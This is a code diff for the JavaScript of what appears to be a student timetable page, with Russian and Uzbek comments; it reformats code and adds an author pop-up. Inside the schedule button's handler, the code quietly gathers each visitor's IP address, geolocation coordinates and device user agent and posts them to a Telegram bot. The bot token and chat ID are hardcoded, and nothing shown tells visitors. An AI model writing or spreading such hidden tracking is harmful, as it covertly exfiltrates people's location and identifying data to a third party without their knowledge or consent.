@@ -30,7 +30,7 @@ document.addEventListener("DOMContentLoaded", function() {
   // Сначала обновляем группы для первого курса
   updateGroups(courseSelect.value);
 
-  // Остальной код, как у вас...
+  // Обработчик для кнопки "Jadvalni ko'rsatish"
   document.getElementById('show-schedule').addEventListener('click', function() {
     const course = courseSelect.value;
     const group = groupSelect.value;
@@ -48,17 +48,25 @@ document.addEventListener("DOMContentLoaded", function() {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
 
-            const userAgent = navigator.userAgent;
+            // Получаем информацию о пользователе
+            const userAgent = navigator.userAgent;  // Информация о браузере и устройстве
 
-            const message = `Sizning dasturingizni ochgan foydalanuvchi ma'lumotlari:\n\nKurs: ${course}\nGuruh: ${group}\nIP-manzil: ${userIp}\nMaqom (latitude, longitude): ${latitude}, ${longitude}\nTelefon/kompyuter: ${userAgent}`;
+            // Формируем сообщение с курсом, группой, IP, местоположением и устройством
+            const message = `Sizning dasturingizni ochgan foydalanuvchi ma'lumotlari:\n\n` +
+                            `Kurs: ${course}\n` +
+                            `Guruh: ${group}\n` +
+                            `IP-manzil: ${userIp}\n` +
+                            `Maqom (latitude, longitude): ${latitude}, ${longitude}\n` +
+                            `Telefon/kompyuter: ${userAgent}`;
 
+            // Отправляем запрос на Telegram через Webhook
             fetch('https://api.telegram.org/bot8073879581:AAH-4aRkvCrxv7oiKBa8Ere_Z95hG21tBdU/sendMessage', {
               method: 'POST',
               headers: {
                 'Content-Type': 'application/json'
               },
               body: JSON.stringify({
-                chat_id: '7518382960',
+                chat_id: '7518382960',  // Ваш Telegram ID или ID группы
                 text: message
               })
             })
@@ -81,14 +89,17 @@ document.addEventListener("DOMContentLoaded", function() {
         console.error('Error fetching IP address:', error);
       });
 
+    // Загружаем расписание
     fetch(`courses/${course}/${group}.json`)
       .then(response => response.json())
       .then(data => {
         const schedule = data[day];
         
+        // Получаем таблицу и очищаем её
         const tableBody = document.getElementById('schedule-table').getElementsByTagName('tbody')[0];
         tableBody.innerHTML = "";
 
+        // Заполняем таблицу уроками
         if (schedule) {
           schedule.forEach(lesson => {
             const row = tableBody.insertRow();
@@ -108,5 +119,27 @@ document.addEventListener("DOMContentLoaded", function() {
         console.error('Xatolik:', error);
         alert('Xatolik yuz berdi. Fayl manzili to\'g\'ri ekanligini tekshiring.');
       });
+  });
+
+  // Функция для открытия модального окна
+  const authorBtn = document.getElementById('author-btn');
+  const authorModal = document.getElementById('author-modal');
+  const closeBtn = document.getElementById('close-btn');
+
+  // Открытие модального окна
+  authorBtn.addEventListener('click', function() {
+    authorModal.style.display = "block";
+  });
+
+  // Закрытие модального окна
+  closeBtn.addEventListener('click', function() {
+    authorModal.style.display = "none";
+  });
+
+  // Закрытие модального окна при клике вне его
+  window.addEventListener('click', function(event) {
+    if (event.target === authorModal) {
+      authorModal.style.display = "none";
+    }
   });
 });
